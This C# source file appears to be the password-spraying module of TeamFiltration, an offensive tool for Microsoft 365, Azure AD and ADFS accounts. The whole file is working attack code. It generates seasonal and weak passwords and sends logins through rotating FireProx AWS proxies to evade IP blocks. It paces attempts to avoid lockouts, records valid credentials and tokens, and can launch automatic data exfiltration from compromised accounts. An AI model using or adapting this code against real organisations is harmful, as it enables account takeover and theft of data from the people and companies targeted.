using Dasync.Collections;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Authentication;
using System.Threading;
using System.Threading.Tasks;
using TeamFiltration.Handlers;
using TeamFiltration.Helpers;
using TeamFiltration.Models.TeamFiltration;
using System.Text.RegularExpressions;
using TeamFiltration.Models.MSOL;
using TimeZoneConverter;

namespace TeamFiltration.Modules
{
    class Spray
    {



        public static async Task<SprayAttempt> SprayAttemptWrap(SprayAttempt sprayAttempt, GlobalArgumentsHandler teamFiltrationConfig, DatabaseHandler _databaseHandler, UserRealmResp userRealmResp)
        {

            var _mainMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY", _databaseHandler);


            try
            {
                var loginResp = await _mainMSOLHandler.LoginSprayAttempt(sprayAttempt, userRealmResp);

                //Check if we got an access token in response
                if (!string.IsNullOrWhiteSpace(loginResp.bearerToken?.access_token))
                {
                    if (userRealmResp.Adfs)
                        _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID!", sprayAttempt.FireProxRegion));
                    else
                        _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID NO MFA!", sprayAttempt.FireProxRegion));
                    sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);
                    sprayAttempt.Valid = true;

                }

                else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description))
                {
                    var respCode = loginResp.bearerTokenError.error_description.Split(":")[0].Trim();
                    var message = loginResp.bearerTokenError.error_description.Split(":")[1].Trim();

                    //Set a default response
                    var errorCodeOut = (msg: $"UNKNOWN {respCode}", valid: false, disqualified: false, accessPolicy: false);

                    //Try to parse
                    Helpers.Generic.GetErrorCodes().TryGetValue(respCode, out errorCodeOut);

                    //Write result
                    var printLogBool = (errorCodeOut.accessPolicy || errorCodeOut.valid || errorCodeOut.disqualified);

                    if (!string.IsNullOrEmpty(errorCodeOut.msg))
                        _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {errorCodeOut.msg}", sprayAttempt.FireProxRegion), true, true);
                    else
                        _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {respCode.Trim()}", sprayAttempt.FireProxRegion), true, true);

                    //If we get a valid response, parse and set the token data as json
                    if (errorCodeOut.valid)
                        sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);

                    sprayAttempt.ResponseCode = respCode;
                    sprayAttempt.Valid = errorCodeOut.valid;
                    sprayAttempt.Disqualified = errorCodeOut.disqualified;
                    sprayAttempt.ConditionalAccess = errorCodeOut.accessPolicy;

                }
                else
                {
                    _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => UNKNOWN or malformed response!", sprayAttempt.FireProxRegion));

                }

                _databaseHandler.WriteSprayAttempt(sprayAttempt, teamFiltrationConfig);
            }
            catch (Exception ex)
            {
                _databaseHandler.WriteLog(new Log("SPRAY", $"SOFT ERROR when spraying  {sprayAttempt.Username}:{sprayAttempt.Password} => {ex.Message}", sprayAttempt.FireProxRegion));

            }
            _databaseHandler._globalDatabase.Checkpoint();



            return sprayAttempt;

        }
        private static async Task<List<SprayAttempt>> SprayAttemptWrap(
            List<SprayAttempt> sprayAttempts,
            GlobalArgumentsHandler teamFiltrationConfig,
            DatabaseHandler _databaseHandler,
            UserRealmResp userRealmResp,
            int delayInSeconds = 0,
            int regionCounter = 0)
        {

            var _mainMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY", _databaseHandler);

            var validSprayAttempts = new List<SprayAttempt>() { };
            await sprayAttempts.ParallelForEachAsync(
                  async sprayAttempt =>
                          {
                              try
                              {


                                  (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) loginResp = await _mainMSOLHandler.LoginSprayAttempt(sprayAttempt, userRealmResp);

                                  if (!string.IsNullOrWhiteSpace(loginResp.bearerToken?.access_token))
                                  {
                                      if (!userRealmResp.Adfs)
                                          _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID!", sprayAttempt.FireProxRegion));
                                      else
                                          _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID NO MFA!", sprayAttempt.FireProxRegion));
                                      sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);
                                      sprayAttempt.Valid = true;

                                  }
                                  else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description) && userRealmResp.Adfs)
                                  {
                                      if (loginResp.bearerTokenError.error_description.Contains("User does not exsists?"))
                                          sprayAttempt.Disqualified = true;

                                      _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {loginResp.bearerTokenError?.error_description}", sprayAttempt.FireProxRegion), true, true);

                                      sprayAttempt.ResponseCode = loginResp.bearerTokenError?.error_description;
                                      sprayAttempt.Valid = false;
                                      sprayAttempt.ConditionalAccess = false;
                                  }
                                  else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description))
                                  {
                                      var respCode = loginResp.bearerTokenError.error_description.Split(":")[0].Trim();
                                      var message = loginResp.bearerTokenError.error_description.Split(":")[1].Trim();

                                      //Set a default response
                                      var errorCodeOut = (msg: $"UNKNOWN {respCode}", valid: false, disqualified: false, accessPolicy: false);

                                      //Try to parse
                                      Helpers.Generic.GetErrorCodes().TryGetValue(respCode, out errorCodeOut);

                                      //Write result
                                      var printLogBool = (errorCodeOut.accessPolicy || errorCodeOut.valid || errorCodeOut.disqualified);

                                      if (!string.IsNullOrEmpty(errorCodeOut.msg))
                                          _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {errorCodeOut.msg}", sprayAttempt.FireProxRegion), true, true);
                                      else
                                          _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {respCode.Trim()}", sprayAttempt.FireProxRegion), true, true);

                                      //If we get a valid response, parse and set the token data as json
                                      if (errorCodeOut.valid)
                                          sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);

                                      sprayAttempt.ResponseCode = respCode;
                                      sprayAttempt.Valid = errorCodeOut.valid;
                                      sprayAttempt.Disqualified = errorCodeOut.disqualified;
                                      sprayAttempt.ConditionalAccess = errorCodeOut.accessPolicy;

                                  }
                                  else
                                  {
                                      _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => UNKNOWN or malformed response!", sprayAttempt.FireProxRegion));

                                  }

                                  if (sprayAttempt.Valid)
                                      validSprayAttempts.Add(sprayAttempt);

                                  _databaseHandler.WriteSprayAttempt(sprayAttempt, teamFiltrationConfig);
                                  Thread.Sleep(delayInSeconds * 1000);
                              }
                              catch (Exception ex)
                              {
                                  _databaseHandler.WriteLog(new Log("SPRAY", $"SOFT ERROR when spraying  {sprayAttempt.Username}:{sprayAttempt.Password} => {ex.Message}", sprayAttempt.FireProxRegion));

                              }
                              _databaseHandler._globalDatabase.Checkpoint();
                          },
                            maxDegreeOfParallelism: 20);



            return validSprayAttempts;
        }
        public static async Task SprayAsync(string[] args)
        {
            Random rnd = new Random();

            var forceBool = args.Contains("--force");

            int sleepInMinutesMax = 100;
            int sleepInMinutesMin = 60;
            int delayInSeconds = 0;

            string StarTime = "";
            string StopTime = "";


            var passwordListPath = args.GetValue("--passwords");
            var exludeListPath = args.GetValue("--exclude");
            var comboListPath = args.GetValue("--combo");

            var shuffleUsersBool = args.Contains("--shuffle-users");
            bool shufflePasswordsBool = args.Contains("--shuffle-passwords");
            bool shuffleFireProxBool = args.Contains("--shuffle-regions");
            bool autoExfilBool = args.Contains("--auto-exfil");

            List<string> passwordList = new List<string>() { };

            string[] excludeList = new string[] { };

            var databaseHandle = new DatabaseHandler(args);

            var _globalProperties = new Handlers.GlobalArgumentsHandler(args, databaseHandle);

            DateTime StarTimeParsed = new DateTime();
            DateTime StopTimeParsed = new DateTime();

            //Calcuate time format for spraying to happen
            if (args.Contains("--time-window"))
            {
                var rawInputTime = args.GetValue("--time-window");

                StarTime = rawInputTime.Trim().Split("-")[0];
                StopTime = rawInputTime.Trim().Split("-")[1];

                DateTime.TryParseExact(StarTime, "HH:mm", new CultureInfo("en-US"), DateTimeStyles.None, out StarTimeParsed);

                DateTime.TryParseExact(StopTime, "HH:mm", new CultureInfo("en-US"), DateTimeStyles.None, out StopTimeParsed);

                if (StarTimeParsed == new DateTime())
                {
                    Console.WriteLine($"[!] Failed to parse provided StarTime {StarTime}");
                    Environment.Exit(0);
                }
                if (StarTimeParsed == new DateTime())
                {

                    Console.WriteLine($"[!] Failed to parse provided StopTime {StopTime}");
                    Environment.Exit(0);
                }


                databaseHandle.WriteLog(new Log("SPRAY", $"Spraying will only occur between {StarTime}-{StopTime}"));
            }

            //Calcuate sleep time from minutes to ms
            if (args.Contains("--sleep-max"))
            {
                sleepInMinutesMax = Convert.ToInt32(args.GetValue("--sleep-max"));
            }

            if (args.Contains("--sleep-min"))
            {
                sleepInMinutesMin = Convert.ToInt32(args.GetValue("--sleep-min"));
            }

            if (args.Contains("--jitter"))
            {
                delayInSeconds = Convert.ToInt32(args.GetValue("--jitter"));
            }
            else
            {
                delayInSeconds = 0;
            }

            databaseHandle.WriteLog(new Log("SPRAY", $"Sleeping between {sleepInMinutesMin}-{sleepInMinutesMax} minutes for each round"!));

            if (!string.IsNullOrEmpty(exludeListPath))
            {
                excludeList = File.ReadAllLines(exludeListPath).Select(x => x.ToLower().Trim()).ToArray();
                databaseHandle.WriteLog(new Log("SPRAY", $"Exlcuding {excludeList.Count()} emails"!));
            }

            if (string.IsNullOrEmpty(passwordListPath))
            {
                if (args.Contains("--seasons-only"))
                    passwordList.AddRange(Helpers.Generic.GenerateSeasonPasswords());

                if (args.Contains("--months-only"))
                    passwordList.AddRange(Helpers.Generic.GenerateMonthsPasswords());

                if (args.Contains("--common-only"))
                    passwordList.AddRange(Helpers.Generic.GenerateWeakPasswords());

                //By Default do them all
                if (passwordList.Count() == 0)
                {
                    passwordList.AddRange(Helpers.Generic.GenerateSeasonPasswords());
                    passwordList.AddRange(Helpers.Generic.GenerateMonthsPasswords());
                    passwordList.AddRange(Helpers.Generic.GenerateWeakPasswords());
                }

            }
            else if (File.Exists(passwordListPath))
                passwordList = File.ReadAllLines(passwordListPath).Where(x => !string.IsNullOrEmpty(x)).ToList();

            //Get a list of valid users from the DB
            string[] userNameListGlobal = databaseHandle.QueryValidAccount().Select(x => x.Username.ToLower()).Distinct().ToArray();

            //Pick the first user to enumerate some basic information about the Tenant
            var getUserRealmResult = await Helpers.Generic.CheckUserRealm(userNameListGlobal.FirstOrDefault(), _globalProperties);

            if (getUserRealmResult.UsGovCloud)
            {
                databaseHandle.WriteLog(new Log("SPRAY", $"US GOV Tenant detected - Updating spraying endpoint from .com => .us"));
                _globalProperties.UsCloud = true;
            }

            if (getUserRealmResult.ThirdPartyAuth && !getUserRealmResult.Adfs)
            {
                databaseHandle.WriteLog(new Log("SPRAY", $"Third party authentication detected - Spraying will NOT work properly, sorry!\nThird-Party Authentication url: " + getUserRealmResult.ThirdPartyAuthUrl));
                Environment.Exit(0);
            }


            //Check if this client has ADFS
            if (getUserRealmResult.Adfs && !_globalProperties.AADSSO)
            {
                databaseHandle.WriteLog(new Log("SPRAY", $"ADFS federation detected => {getUserRealmResult.ThirdPartyAuthUrl}"));
                databaseHandle.WriteLog(new Log("SPRAY", $"TeamFiltration ADFS support in beta, be carefull :) "));
                _globalProperties.ADFS = true;

            }


            //Remove user exlucde users.
            userNameListGlobal = userNameListGlobal.Except(excludeList).ToArray();


            //Generate a random sleep time based on min-max
            var currentSleepTime = (new Random()).Next(sleepInMinutesMin, sleepInMinutesMax);
            var regionCounter = rnd.Next(_globalProperties.AWSRegions.Length - 1);

        sprayCalc:

            if (args.Contains("--time-window"))
            {
                if (!Helpers.Generic.IsBewteenTwoDates(DateTime.Now, StarTimeParsed, StopTimeParsed))
                {
                    //If we are passed stoptime, we are waiting for the startime the next day, same goes for stoptime
                    StarTimeParsed = StarTimeParsed.AddDays(1);
                    StopTimeParsed = StarTimeParsed.AddDays(1);

                    databaseHandle.WriteLog(new Log("SPRAY", $"Pausing spraying until {StarTimeParsed}"));

                    //Minute since that
                    int minutesSinceFirstAccountSprayed = Convert.ToInt32(DateTime.Now.Subtract(StarTimeParsed).TotalMinutes);

                    //time left to sleep based on this
                    int timeLeftToSleep = currentSleepTime - minutesSinceFirstAccountSprayed;
                    Thread.Sleep((int)TimeSpan.FromMinutes(timeLeftToSleep).TotalMilliseconds);

                }
            }


            var listOfSprayAttempts = new List<SprayAttempt>() { };


            //Query Disqualified accounts
            List<SprayAttempt> diqualifiedAccounts = databaseHandle.QueryDisqualified();

            //Remove Disqualified accounts from the spray list
            var bufferuserNameList = userNameListGlobal.Except(diqualifiedAccounts.Select(x => x.Username.ToLower())).ToList();

            //Query emails that has been sprayed in the last X minutes (based on sleep time)
            var accountsRecentlySprayed = databaseHandle.QuerySprayAttempts(currentSleepTime).OrderByDescending(x => x?.DateTime).ToList();

            //If all accounts has been sprayed in the last 90 minutes, and we are not forcing sprays, sleep
            if (accountsRecentlySprayed.Select(x => x.Username.ToLower()).Distinct().Count() >= bufferuserNameList.Count() && !forceBool)
            {
                //Find spray attempt most recent
                var mostRecentAccountSprayed = accountsRecentlySprayed.OrderByDescending(x => x?.DateTime).FirstOrDefault().DateTime;

                //Minute since that
                int minutesSinceFirstAccountSprayed = Convert.ToInt32(DateTime.Now.Subtract(mostRecentAccountSprayed).TotalMinutes);

                //time left to sleep based on this
                int timeLeftToSleep = currentSleepTime - minutesSinceFirstAccountSprayed;
                TimeZoneInfo easternZone = TZConvert.GetTimeZoneInfo("Eastern Standard Time");


                databaseHandle.WriteLog(new Log("SPRAY", $"{minutesSinceFirstAccountSprayed}m since last spray, spraying will resume {TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow.AddMinutes(timeLeftToSleep), easternZone)} EST"));
                Thread.Sleep((int)TimeSpan.FromMinutes(timeLeftToSleep).TotalMilliseconds);
                goto sprayCalc;
            }
            //If we are forcing spray, go ahead
            else if (forceBool)
            {   //however only force one round
                forceBool = false;
            }
            else if (accountsRecentlySprayed.Count() > 0)
            {   //Since we are finishing up a previous spray, remove the ones to not hit
                bufferuserNameList = bufferuserNameList.Except(accountsRecentlySprayed.Select(x => x.Username.ToLower())).ToList();
                databaseHandle.WriteLog(new Log("SPRAY", $"Uneven spray round detected"));
            }


            //Get all previous password and email combinations
            List<string> allCombos = databaseHandle.QueryAllCombos();

            var fireProxList = new List<(Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl)>();

            if (shuffleUsersBool)
                bufferuserNameList = bufferuserNameList.Randomize().ToList();


            for (int regionCount = 0; regionCount < _globalProperties.AWSRegions.Length; regionCount++)
            {
                if (_globalProperties.AADSSO)
                    fireProxList.Add(_globalProperties.GetFireProxURLObject("https://autologon.microsoftazuread-sso.com", regionCount));
                else if (_globalProperties.UsCloud)
                {
                    var fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.us", regionCount);
                    fireProxObject.fireProxUrl = fireProxObject.fireProxUrl + "common/oauth2/token";
                    fireProxList.Add(fireProxObject);


                }
                else if (_globalProperties.ADFS)
                {
                    Uri adfsHost = new Uri(getUserRealmResult.ThirdPartyAuthUrl);
                    (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) adfsFireProxObject = _globalProperties.GetFireProxURLObject($"https://{adfsHost.Host}", regionCount);
                    string adfsFireProxUrl = adfsFireProxObject.fireProxUrl.TrimEnd('/') + $"{adfsHost.PathAndQuery}";
                    adfsFireProxObject.fireProxUrl = adfsFireProxUrl;
                    fireProxList.Add(adfsFireProxObject);
                }

                else
                {
                    var fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", regionCount);
                    fireProxObject.fireProxUrl = fireProxObject.fireProxUrl + "common/oauth2/token";
                    fireProxList.Add(fireProxObject);
                }

                if (!shuffleFireProxBool)
                    break;
            }


            await bufferuserNameList.ParallelForEachAsync(
               async userName =>
               {

                   if (shufflePasswordsBool)
                       passwordList = passwordList.Randomize().ToList();

                   foreach (var password in passwordList)
                   {
                       var fireProxObject = fireProxList.First();

                       if (shuffleFireProxBool)
                           fireProxObject = fireProxList.Randomize().First();

                       //If this combo does NOT exsits, add it
                       if (!allCombos.Contains(userName.ToLower() + ":" + password))
                       {
                           var randomResource = Helpers.Generic.RandomO365Res();

                           listOfSprayAttempts.Add(new SprayAttempt()
                           {

                               Username = userName,
                               Password = password,
                               //ComboHash = "",
                               FireProxURL = fireProxObject.fireProxUrl,
                               FireProxRegion = fireProxObject.Item2.Region,
                               ResourceClientId = randomResource.clientId,
                               ResourceUri = randomResource.Uri,
                               AADSSO = _globalProperties.AADSSO,
                               ADFS = getUserRealmResult.Adfs
                           });
                           break;
                       }
                   }
               },
                 maxDegreeOfParallelism: 500);

            if (_globalProperties.AWSRegions.Length - 1 == regionCounter)
                regionCounter = 0;
            else
                regionCounter++;

            //If i get to this point without any spray items in listOfSprayAttempts,i have nothing left
            if (listOfSprayAttempts.Count() == 0)
            {
                foreach (var fireProxObject in fireProxList)
                {
                    await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
                    Environment.Exit(0);
                }
            }


            var validAccounts = await SprayAttemptWrap(listOfSprayAttempts, _globalProperties, databaseHandle, getUserRealmResult, delayInSeconds, regionCounter);

            foreach (var fireProxObject in fireProxList)
            {
                await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
            }


            if (autoExfilBool && validAccounts.Count() > 0)
            {
                foreach (var item in validAccounts)
                {
                    databaseHandle.WriteLog(new Log("SPRAY", $"Launching automatic exfiltration"));
                    await Exfiltrate.ExfiltrateAsync(args, item.Username, databaseHandle);
                }

            }

            goto sprayCalc;
        }

    }

}

